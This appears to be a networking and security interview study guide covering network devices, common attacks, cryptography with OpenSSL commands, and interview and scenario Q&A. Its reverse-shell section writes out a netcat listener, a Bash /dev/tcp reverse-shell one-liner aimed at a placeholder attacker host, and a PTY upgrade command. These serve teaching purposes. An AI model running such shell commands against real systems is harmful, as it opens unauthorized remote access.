#### Common Frameworks/Tools
- **Metasploit**: Framework with modules for exploits, payloads, and post-exploitation.
- **Burp Suite**: Web application testing (interception, fuzzing, manual exploitation).
- **searchsploit**: CLI search against Exploit-DB.

---

# Reverse Shells and Bind Shells

#### Bind Shell
The target machine opens a listening port and waits for the attacker to connect. Requires the target's port to be reachable — often blocked by firewalls/NAT on the target side.

#### Reverse Shell
The target machine initiates the connection back to the attacker's listener. Preferred in practice because outbound connections are commonly less restricted than inbound ones.

```text
Attacker (listener)  ←──── connects ────  Target (victim)
```

**Attacker sets up a listener:**
```bash
nc -lvnp 4444
```

**Target connects back (example, Linux Bash):**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Common reverse shell payloads:** Netcat, Bash, Python, PHP, PowerShell (Windows) — the mechanism differs, the principle is the same: victim connects out to attacker.

#### Shell Stabilization
Raw reverse shells are often unstable (no job control, no tab-completion). Common upgrade technique:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
followed by setting terminal size and enabling raw mode for a fully interactive TTY.

> **Note:** Reverse/bind shell techniques are standard penetration-testing and CTF knowledge — only use them against systems you own or are explicitly authorized to test.

---

# Network Security Devices

#### Firewall
Filters incoming and outgoing traffic based on defined security rules. Types include packet-filtering, stateful inspection, and next-generation firewalls (NGFW) with deep packet inspection.

#### IDS (Intrusion Detection System)
Monitors network traffic for suspicious activity and alerts administrators, but doesn't block traffic.

#### IPS (Intrusion Prevention System)
Similar to IDS but actively blocks or prevents detected threats in real time.

#### DMZ (Demilitarized Zone)
A buffer network segment placed between the internal trusted network and the untrusted internet, hosting public-facing services (web servers, mail servers) while isolating the internal network.

#### VPN (Virtual Private Network)
Creates an encrypted tunnel over a public network, allowing secure remote access. Common protocols: IPsec, OpenVPN, WireGuard, SSL/TLS VPN.

---

# Common Cyber Threats and Attacks

#### Malware
- **Virus**: Attaches to files, requires user action to spread.
- **Worm**: Self-replicating, spreads without user interaction.
- **Trojan**: Disguised as legitimate software.
- **Ransomware**: Encrypts data and demands payment for the decryption key.
- **Spyware**: Secretly monitors user activity.
- **Rootkit**: Hides deep in the system to maintain persistent, privileged access.

#### Phishing
Deceptive attempts (usually email) to trick users into revealing sensitive information or clicking malicious links. Variants: spear phishing (targeted), whaling (targets executives), smishing (SMS), vishing (voice).

#### Man-in-the-Middle (MITM)
An attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly.

#### DoS / DDoS
- **DoS**: Overwhelms a system from a single source, denying service to legitimate users.
- **DDoS**: Same, but from multiple distributed sources (often a botnet), harder to mitigate.

#### SQL Injection
Attacker inserts malicious SQL code into input fields to manipulate or extract data from a database.

#### Cross-Site Scripting (XSS)
Attacker injects malicious scripts into trusted websites that execute in a victim's browser.

#### Social Engineering
Manipulating people psychologically into divulging confidential information or performing actions that compromise security.

#### Zero-Day Attack
An exploit targeting a vulnerability that is unknown to the vendor and has no available patch yet.

#### ARP Spoofing / Poisoning
Attacker sends falsified ARP messages to associate their MAC address with a legitimate IP, enabling traffic interception.

#### Brute Force Attack
Systematically attempting all possible password combinations until the correct one is found.

#### Cross-Site Request Forgery (CSRF)
Tricks an authenticated user's browser into submitting unwanted requests to a site they're logged into, performing actions without their consent.

#### Buffer Overflow
Occurs when a program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and allowing arbitrary code execution.

#### Privilege Escalation
Exploiting a bug or misconfiguration to gain higher-level access than intended (vertical) or access to other accounts at the same level (horizontal).

#### Supply Chain Attack
Compromising a trusted third-party vendor or software component to indirectly attack the target organization.

#### Insider Threat
A security risk originating from someone within the organization (employee, contractor) with legitimate access.

---

# Cryptography

**Cryptography** is the practice of protecting information using mathematical techniques. It is used to provide **confidentiality, integrity, authentication, and non-repudiation**.

The main cryptographic concepts used in networking and Linux security are:

* Symmetric encryption
* Asymmetric encryption
* Hashing
* Digital signatures
* PKI
* Digital certificates
* SSL/TLS
* Salting

#### Symmetric Encryption

Symmetric encryption uses **the same secret key** to encrypt and decrypt data.

```text
Plaintext
   ↓
[ Encryption + Secret Key ]
   ↓
Ciphertext
   ↓
[ Decryption + Same Secret Key ]
   ↓
Plaintext
```

The main advantage is **speed**. Symmetric algorithms are much faster than asymmetric algorithms and are therefore commonly used to encrypt large amounts of data.

The main challenge is **key distribution**: both parties need to securely obtain the same secret key.

**Examples:**

| Algorithm | Description                                       |
| --------- | ------------------------------------------------- |
| AES       | Modern, secure, widely used symmetric cipher      |
| DES       | Old 56-bit cipher; considered insecure            |
| 3DES      | Applies DES multiple times; legacy and deprecated |

##### AES (Advanced Encryption Standard)

AES is one of the most widely used symmetric encryption algorithms.

Common key sizes are:

* AES-128
* AES-192
* AES-256

The number represents the **key size in bits**, not the block size. AES always uses a **128-bit block size**.

AES is commonly used for:

* Disk encryption
* VPNs
* TLS
* File encryption
* Database encryption
* Application-level encryption

**Linux command:**

```bash
openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.txt -out secret.txt.enc
```

This command:

* `openssl` → invokes OpenSSL.
* `enc` → uses OpenSSL's symmetric encryption interface.
* `-aes-256-cbc` → uses AES-256 in CBC mode.
* `-salt` → adds a random salt when deriving the encryption key from a password.
* `-pbkdf2` → derives the encryption key using PBKDF2.
* `-in secret.txt` → input file.
* `-out secret.txt.enc` → encrypted output file.

OpenSSL asks for a password and derives the encryption key from it.

To decrypt:

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in secret.txt.enc -out secret.txt
```

`-d` means **decrypt**.

> AES-CBC provides confidentiality but does not by itself provide authentication/integrity. Modern applications commonly prefer authenticated encryption modes such as AES-GCM.

##### DES

DES is an old symmetric encryption algorithm using an effective **56-bit key**.

Because modern computers can brute-force its key space, DES is considered **insecure** and should not be used for new systems.

```text
DES → Legacy → Insecure
AES → Modern → Preferred
```

**Linux/OpenSSL example:**

```bash
openssl enc -des-cbc -in secret.txt -out secret.des
```

This is useful mainly for understanding legacy systems, not for protecting new data.

##### 3DES (Triple DES)

3DES applies the DES operation multiple times to increase security compared with original DES.

It was historically used in:

* Banking systems
* Payment systems
* Legacy applications
* Older network protocols

However, 3DES is now considered **legacy/deprecated** and should generally be replaced with AES.

#### Asymmetric Encryption

Asymmetric cryptography uses a **pair of mathematically related keys**:

* **Public key** → can be shared with others.
* **Private key** → must remain secret.

```text
              Key Pair
             /        \
       Public Key    Private Key
          ↓              ↓
      Share openly    Keep secret
```

Unlike symmetric encryption, the same key is not used for both operations.

Asymmetric cryptography is commonly used for:

* Secure key exchange
* Authentication
* Digital signatures
* Certificates
* SSH
* TLS

It is computationally more expensive than symmetric encryption, so systems commonly use asymmetric cryptography to establish trust or exchange keys and then use symmetric encryption for the actual data transfer.

#### RSA (Rivest-Shamir-Adleman)

RSA is a widely known asymmetric cryptographic algorithm based on the mathematical difficulty of factoring large numbers.

RSA uses:

* Public key
* Private key

It can be used for:

* Encryption
* Digital signatures
* Authentication
* Key transport

Modern RSA keys commonly use sizes such as **2048 or 3072 bits**.

**Generate an RSA private key:**

```bash
openssl genrsa -out private.key 2048
```

This creates a 2048-bit RSA private key.

**Extract the public key:**

```bash
openssl rsa -in private.key -pubout -out public.key
```

The resulting files are:

```text
private.key → Keep secret
public.key  → Can be shared
```

**Important:** RSA is generally not used to encrypt large files directly. Symmetric encryption is much more efficient for bulk data.

#### ECC (Elliptic Curve Cryptography)

ECC uses mathematical properties of **elliptic curves** to provide asymmetric cryptography.

Its major advantage is that it can provide strong security with **smaller keys** compared with RSA.

ECC is commonly used in:

* TLS
* SSH
* Digital signatures
* Mobile devices
* Modern authentication systems

Common elliptic-curve algorithms include:

* ECDSA → digital signatures
* ECDH → key agreement

**Generate an EC private key:**

```bash
openssl ecparam -name prime256v1 -genkey -noout -out ec-private.key
```

Extract the public key:

```bash
openssl ec -in ec-private.key -pubout -out ec-public.key
```

The `prime256v1` curve is also commonly referred to as **secp256r1**.

#### Diffie-Hellman (DH)

Diffie-Hellman is primarily a **key-agreement protocol**, not an encryption algorithm.

It allows two parties to establish a shared secret over an insecure network without directly transmitting the secret itself.

Simplified:

```text
Alice                          Bob
  │                             │
  │──── Public information ─────│
  │                             │
  │   Calculate shared secret   │
  │                             │
  └──────── Same secret ────────┘
```

An attacker may observe the exchanged public information but should not be able to practically calculate the resulting shared secret when appropriate parameters are used.

**Linux/OpenSSL example:**

Generate DH parameters:

```bash
openssl dhparam -out dhparam.pem 2048
```

This creates Diffie-Hellman parameters that can be used by applications supporting DH.

Modern TLS commonly uses **ephemeral Diffie-Hellman variants**, such as ECDHE, to provide forward secrecy.

#### Hashing

Hashing converts input data into a **fixed-length digest**.

```text
Input
  ↓
Hash Function
  ↓
Fixed-Length Digest
```

A cryptographic hash function should make it computationally infeasible to:

* Recover the original input from the hash.
* Find another input producing the same hash.
* Modify the input without changing the resulting digest.

Hashing is **not encryption** because there is normally no decryption operation.

Common examples:

| Algorithm | Status                                   | Common use                               |
| --------- | ---------------------------------------- | ---------------------------------------- |
| SHA-256   | Secure for general cryptographic hashing | Integrity, signatures, checksums         |
| SHA-512   | Secure for general cryptographic hashing | Integrity and cryptographic applications |
| MD5       | Broken for collision resistance          | Legacy checksums only                    |
| SHA-1     | Broken for collision resistance          | Legacy systems                           |
| bcrypt    | Password hashing                         | Password storage                         |

##### SHA-256

SHA-256 produces a **256-bit digest**, normally represented as 64 hexadecimal characters.

Example:

```bash
echo -n "hello" | sha256sum
```

The command:

* `echo -n "hello"` → outputs `hello` without a newline.
* `|` → sends the output to the next command.
* `sha256sum` → calculates the SHA-256 digest.

To hash a file:

```bash
sha256sum secret.txt
```

This is useful for checking whether a file has changed.

For example:

```text
Original file
     ↓
SHA-256
     ↓
ABC123...

File received
     ↓
SHA-256
     ↓
ABC123...
```

If both digests match, the files have the same content with extremely high probability.

##### MD5

MD5 produces a 128-bit digest but is **not considered secure for cryptographic integrity or signatures** because practical collision attacks exist.

Linux command:

```bash
md5sum secret.txt
```

MD5 may still appear in legacy systems or non-security-sensitive file identification, but it should not be selected for new security designs.

##### bcrypt

bcrypt is specifically designed for **password hashing**.

Unlike a fast hash such as SHA-256, bcrypt is intentionally computationally expensive, making large-scale password guessing more difficult.

Example:

```bash
htpasswd -bnBC 12 "" 'MyPassword' | tr -d ':\n'
```

This can generate a bcrypt password hash when the Apache `htpasswd` utility is installed.

The `12` is the bcrypt **cost factor**.

> For new password-storage systems, modern password-hashing choices may also include Argon2id, depending on application support.

#### Digital Signatures

A digital signature proves that data was signed by someone possessing a particular **private key** and that the signed data has not been altered.

Simplified process:

```text
Message
   ↓
Hash
   ↓
Sign hash with Private Key
   ↓
Digital Signature
```

The receiver uses the corresponding public key to verify the signature.

```text
Message + Signature
        ↓
 Public Key
        ↓
 Verify
        ↓
Valid / Invalid
```

Digital signatures provide:

* **Authentication** — identifies the holder of the private key.
* **Integrity** — detects changes to the signed data.
* **Non-repudiation** — provides evidence that the private-key holder created the signature, subject to the surrounding key-management and legal context.

**Linux/OpenSSL example:**

Generate a signature:

```bash
openssl dgst -sha256 -sign private.key -out signature.bin secret.txt
```

Verify it:

```bash
openssl dgst -sha256 -verify public.key -signature signature.bin secret.txt
```

If the signature matches, OpenSSL reports:

```text
Verified OK
```

If the file is modified after signing, verification fails.

#### PKI (Public Key Infrastructure)

PKI is the larger framework used to **create, distribute, manage, validate, and revoke digital certificates and public keys**.

PKI commonly involves:

* **Certificate Authority (CA)** — trusted organization that issues certificates.
* **Root CA** — trust anchor at the top of a certificate chain.
* **Intermediate CA** — issues certificates on behalf of a root CA.
* **Registration Authority (RA)** — helps validate certificate requests/identities.
* **Digital certificates** — bind identities to public keys.
* **Certificate revocation mechanisms** — such as CRLs and OCSP.

A simplified hierarchy:

```text
Root CA
   ↓
Intermediate CA
   ↓
Server Certificate
   ↓
example.com
```

When a browser connects to a secure website, it can validate the server's certificate against trusted CA certificates.

#### Digital Certificates

A digital certificate is an electronic document that binds a **public key to an identity**.

A typical TLS certificate contains information such as:

* Subject/domain information
* Public key
* Issuer
* Validity period
* Serial number
* Signature from the issuing CA
* Subject Alternative Names (SANs)

Example:

```text
example.com
     ↓
Certificate
     ↓
Public Key
     ↓
Signed by CA
```

The CA's digital signature allows clients to verify that the certificate was issued by a trusted authority.

**Inspect a certificate:**

```bash
openssl x509 -in certificate.crt -text -noout
```

This displays certificate details in human-readable form.

For a live HTTPS server:

```bash
openssl s_client -connect example.com:443 -servername example.com
```

This establishes a TLS connection and displays certificate/TLS information.

#### SSL/TLS

**TLS (Transport Layer Security)** protects data transmitted between applications over a network.

SSL is the older predecessor to TLS and is **obsolete and insecure**. Modern systems should use TLS.

TLS provides:

* Encryption
* Integrity
* Server authentication
* Optional client authentication

A simplified TLS connection:

```text
Client
  │
  │ ClientHello
  ↓
Server
  │
  │ Certificate + TLS parameters
  ↓
Client
  │
  │ Key agreement
  ↓
Secure encrypted session
```

The exact handshake differs by TLS version and negotiated cipher suite, but modern TLS generally uses asymmetric cryptography for authentication and/or key agreement and symmetric cryptography for efficient bulk encryption.

**Common port:**

```text
HTTPS → TCP 443
```

Inspect a TLS server:

```bash
openssl s_client -connect example.com:443 -servername example.com
```

Useful information can include:

* Certificate chain
* TLS version
* Negotiated cipher
* Server certificate
* Connection details

Check supported TLS versions/ciphers with tools such as:

```bash
openssl ciphers -v
```

#### Salting

A **salt** is random data added to a password before password hashing.

Without salting:

```text
Password
   ↓
Hash
   ↓
Same password → Same hash
```

With salting:

```text
Password + Random Salt
          ↓
       Hashing
          ↓
       Password Hash
```

Different users with the same password should therefore have different stored password hashes.

Example:

```text
User A:
Password + Salt A → Hash A

User B:
Password + Salt B → Hash B
```

Salting helps defend against:

* Precomputed rainbow tables
* Simple hash lookup attacks
* Identical hashes revealing identical passwords

A salt does **not** need to be secret. It is normally stored alongside the password hash.

Password-hashing algorithms such as **bcrypt, scrypt, and Argon2** automatically incorporate salts as part of their normal operation.

#### Encryption vs Hashing vs Encoding

These concepts are often confused.

| Technique         | Reversible?                  | Uses Key?          | Main Purpose               |
| ----------------- | ---------------------------- | ------------------ | -------------------------- |
| Encryption        | Yes                          | Yes                | Confidentiality            |
| Hashing           | No                           | No                 | Integrity / fingerprinting |
| Encoding          | Yes                          | No                 | Data representation        |
| Digital Signature | Verification, not decryption | Private/public key | Authenticity + integrity   |

Example:

```text
Encryption:
"hello" → encrypted data → "hello"

Hashing:
"hello" → SHA-256 → digest

Encoding:
"hello" → Base64 → "aGVsbG8="
```

**Base64 is not encryption.** Anyone can decode it.

Linux example:

```bash
echo -n "hello" | base64
```

Decode:

```bash
echo -n "aGVsbG8=" | base64 -d
```

#### Symmetric vs Asymmetric

| Symmetric                                  | Asymmetric                                |
| ------------------------------------------ | ----------------------------------------- |
| One shared secret key                      | Public/private key pair                   |
| Same secret used for encryption/decryption | Different but mathematically related keys |
| Very fast                                  | Slower                                    |
| Good for bulk data                         | Good for authentication/key exchange      |
| Key distribution is challenging            | Public key can be shared                  |
| AES                                        | RSA, ECC                                  |
| Used for bulk TLS encryption               | Used for TLS authentication/key agreement |

#### Common Cryptography Algorithms

| Category             | Examples                | Main Purpose                 |
| -------------------- | ----------------------- | ---------------------------- |
| Symmetric encryption | AES                     | Encrypt bulk data            |
| Legacy symmetric     | DES, 3DES               | Legacy systems               |
| Asymmetric           | RSA                     | Encryption/signatures        |
| Asymmetric           | ECC                     | Signatures/key agreement     |
| Key agreement        | DH, ECDH                | Establish shared secrets     |
| Hashing              | SHA-256, SHA-512        | Integrity/fingerprinting     |
| Legacy hashing       | MD5, SHA-1              | Legacy/non-security uses     |
| Password hashing     | bcrypt, Argon2id        | Secure password storage      |
| Digital signature    | RSA-PSS, ECDSA, Ed25519 | Authentication/integrity     |
| Transport security   | TLS                     | Secure network communication |

#### Useful Linux Cryptography Commands

| Command                                                       | Purpose                                 |
| ------------------------------------------------------------- | --------------------------------------- |
| `openssl version`                                             | Show OpenSSL version                    |
| `sha256sum file`                                              | Calculate SHA-256 hash                  |
| `sha512sum file`                                              | Calculate SHA-512 hash                  |
| `md5sum file`                                                 | Calculate MD5 hash                      |
| `openssl rand -hex 32`                                        | Generate 32 random bytes as hexadecimal |
| `openssl genrsa -out private.key 2048`                        | Generate RSA private key                |
| `openssl rsa -in private.key -pubout`                         | Extract RSA public key                  |
| `openssl ecparam -name prime256v1 -genkey -noout -out ec.key` | Generate EC private key                 |
| `openssl x509 -in cert.crt -text -noout`                      | Inspect certificate                     |
| `openssl dgst -sha256 -sign private.key -out sig file`        | Create digital signature                |
| `openssl dgst -sha256 -verify public.key -signature sig file` | Verify digital signature                |
| `openssl s_client -connect host:443`                          | Inspect a TLS connection                |
| `openssl ciphers -v`                                          | List available cipher suites            |
| `openssl rand -base64 32`                                     | Generate random data                    |
| `base64 file`                                                 | Encode data using Base64                |
| `base64 -d file`                                              | Decode Base64 data                      |

> **Security note:** For new systems, prefer modern algorithms and constructions such as **AES-GCM/ChaCha20-Poly1305, SHA-256/SHA-512 where appropriate, Ed25519/ECDSA, modern TLS, and Argon2id/bcrypt for passwords**. Avoid DES, 3DES, MD5, SHA-1, SSL, and direct password-based encryption schemes unless you are specifically dealing with legacy systems.

---

# Interview Questions and Answers

**Q: What is the difference between the OSI model and the TCP/IP model?**
A: OSI is a 7-layer theoretical reference model used to understand and standardize networking concepts, while TCP/IP is a 4-layer practical model that the actual internet is built on. TCP/IP combines several OSI layers (Application, Presentation, Session into one Application layer, and Physical/Data Link into one Network Access layer).

**Q: What happens when you type a URL into a browser and press Enter?**
A: The browser checks its cache, then performs DNS resolution to get the IP address, establishes a TCP connection via a three-way handshake, performs a TLS handshake if HTTPS, sends an HTTP request, the server processes and returns a response, and the browser renders the page.

**Q: What is the difference between TCP and UDP, and when would you use each?**
A: TCP is connection-oriented and reliable, ideal for applications like web browsing, email, and file transfer where data integrity matters. UDP is connectionless and faster but doesn't guarantee delivery, making it suitable for video streaming, VoIP, and gaming where speed matters more than perfect reliability.

**Q: Explain the TCP three-way handshake.**
A: The client sends a SYN packet to initiate a connection, the server responds with SYN-ACK to acknowledge and agree, and the client sends a final ACK to confirm - after which the connection is established and data transfer can begin.

**Q: What is the difference between a switch and a router?**
A: A switch operates at Layer 2, connecting devices within the same network and forwarding frames using MAC addresses stored in a CAM table. A router operates at Layer 3, connecting different networks and forwarding packets using IP addresses based on a routing table.

**Q: What is NAT, and why is it needed?**
A: NAT translates private IP addresses into a public IP address so devices on a private network can communicate with the internet. It's needed because IPv4 address space is limited, and NAT allows many internal devices to share a single public IP.

**Q: What is the difference between NAT and PAT?**
A: NAT can be a one-to-one (static) or many-to-many (dynamic pool) mapping of private to public IPs. PAT (NAT overload) is a many-to-one mapping where multiple internal devices share a single public IP, differentiated by unique port numbers.

**Q: What is subnetting and why is it used?**
A: Subnetting divides a larger network into smaller subnetworks by borrowing bits from the host portion of an address. It's used to reduce broadcast domains, improve security through segmentation, and use IP address space efficiently.

**Q: What is the difference between a public and private IP address?**
A: Private IPs are used within internal networks and are not routable on the internet (e.g., 192.168.x.x). Public IPs are globally unique and routable on the internet, typically assigned by an ISP.

**Q: What is a CAM table and how can it be attacked?**
A: A CAM table maps MAC addresses to switch ports, allowing efficient frame forwarding. Attackers can perform a MAC flooding attack, overwhelming the table with fake addresses to force the switch into "fail-open" mode, flooding traffic to all ports and enabling sniffing.

**Q: What is the difference between symmetric and asymmetric encryption?**
A: Symmetric encryption uses one shared key for both encryption and decryption, making it fast but requiring secure key distribution. Asymmetric encryption uses a public/private key pair, solving the key distribution problem but at the cost of speed.

**Q: What is the difference between encryption and hashing?**
A: Encryption is reversible (given the correct key, ciphertext can be decrypted back to plaintext), used for confidentiality. Hashing is a one-way function used to verify integrity; the original data cannot be recovered from the hash.

**Q: What is the CIA triad?**
A: Confidentiality (only authorized access), Integrity (data isn't altered), and Availability (systems accessible when needed) - the three core principles of information security.

**Q: What is the difference between IDS and IPS?**
A: An IDS passively monitors traffic and alerts administrators to suspicious activity without blocking it. An IPS actively monitors and blocks or prevents malicious traffic in real time.

**Q: What is a DMZ and why is it used?**
A: A DMZ is a network segment isolated between the internal trusted network and the external untrusted internet, used to host public-facing services like web or mail servers, limiting exposure of the internal network if that server is compromised.

**Q: What is the difference between IPv4 and IPv6?**
A: IPv4 uses 32-bit addresses (about 4.3 billion addresses) in dotted decimal notation, while IPv6 uses 128-bit addresses in hexadecimal notation, offering a vastly larger address space, built-in IPsec support, and elimination of the need for NAT.

**Q: What is ARP and how does ARP spoofing work?**
A: ARP (Address Resolution Protocol) resolves an IP address to a MAC address on a local network. ARP spoofing involves an attacker sending forged ARP replies to associate their own MAC address with another device's IP (often the gateway), allowing them to intercept traffic (a MITM attack).

---

# Scenario-Based Questions and Answers

**Scenario: A user reports they can access websites by IP address but not by domain name. What's the likely issue and how do you troubleshoot?**
A: This points to a DNS resolution problem, not a connectivity problem. Steps: check DNS server configuration on the client (`ipconfig /all` or `cat /etc/resolv.conf`), try `nslookup` or `dig` on the domain, test with a different DNS server (e.g., 8.8.8.8), flush the local DNS cache, and check if the DNS server itself is reachable and responding.

**Scenario: Two departments on the same physical switch need to be isolated from each other for security reasons, but you can't add new physical switches. What do you do?**
A: Implement VLANs to logically segment the switch into separate broadcast domains for each department. If they need to communicate, configure inter-VLAN routing through a Layer 3 switch or router, with appropriate ACLs to control what traffic is allowed between them.

**Scenario: A company's public-facing web server was compromised, and the attacker is now trying to move laterally into the internal network. What network design would have limited this risk?**
A: The web server should have been placed in a DMZ, isolated from the internal network by a firewall, so that even if compromised, the attacker cannot directly reach internal systems without passing through additional security controls.

**Scenario: You notice unusually high broadcast traffic degrading network performance across a large flat network. What's the cause and the fix?**
A: A large flat (unsegmented) Layer 2 network creates one large broadcast domain. As the number of devices grows, broadcast traffic (ARP requests, DHCP, etc.) increases and degrades performance. Fix: segment the network into VLANs/subnets to reduce the size of each broadcast domain.

**Scenario: A remote employee needs to securely access internal company resources from home. What solution do you implement?**
A: A VPN (using IPsec or SSL/TLS) should be set up to create an encrypted tunnel between the employee's device and the corporate network, combined with MFA for authentication to reduce risk if credentials are compromised.

**Scenario: An internal application is randomly slow, and you suspect a switch is silently flooding traffic to every port instead of forwarding intelligently. What's happening and how do you confirm it?**
A: This suggests a CAM table overflow (MAC flooding) attack or a full/corrupted CAM table causing the switch to behave like a hub. Confirm by checking the switch's MAC address table for abnormal entries or excessive entries from a single port, and check for high broadcast/flood traffic in monitoring tools. Mitigate with port security limiting the number of MAC addresses per port.

**Scenario: A user's laptop has an IP address like 169.254.x.x and cannot access the network. What does this indicate?**
A: This is an APIPA address, indicating the device failed to get an IP from a DHCP server. Troubleshoot by checking DHCP server availability, cable/Wi-Fi connectivity, VLAN configuration on the switch port, and DHCP relay/scope configuration if the client is on a different subnet.

**Scenario: You need two servers to communicate securely over an untrusted network, ensuring both confidentiality and that neither side can later deny having sent a message. What do you implement?**
A: Use TLS with mutual authentication (mTLS) for confidentiality and authentication, combined with digital signatures using each server's private key, ensuring non-repudiation - the signer cannot deny having signed the data since only their private key could have produced that signature.

**Scenario: Your organization's routing table shows a route to a destination via both OSPF (AD 110) and a static route (AD 1) with different next hops. Which one is used and why?**
A: The static route is used because it has a lower administrative distance (1) than OSPF (110). Routers prefer routes with lower administrative distance regardless of the metric within a routing protocol, since AD determines trustworthiness of the source, not path efficiency.

**Scenario: A network segment is running out of usable IP addresses in its /24 subnet, but neighboring subnets have lots of unused addresses. What's the long-term fix?**
A: Redesign the addressing scheme using VLSM (Variable Length Subnet Masking) to allocate subnet sizes based on actual host requirements per segment, rather than using a fixed /24 everywhere - freeing up unused address space from oversized subnets for undersized ones.

---

# Quick Reference Summary

| Concept | Layer | Key Point |
|---|---|---|
| MAC Address | Layer 2 | Physical/hardware address |
| Switch | Layer 2 | Forwards using CAM table |
| IP Address | Layer 3 | Logical address |
| Router | Layer 3 | Forwards using routing table |
| TCP/UDP | Layer 4 | End-to-end transport |
| DNS/HTTP/FTP | Layer 7 | Application-level protocols |
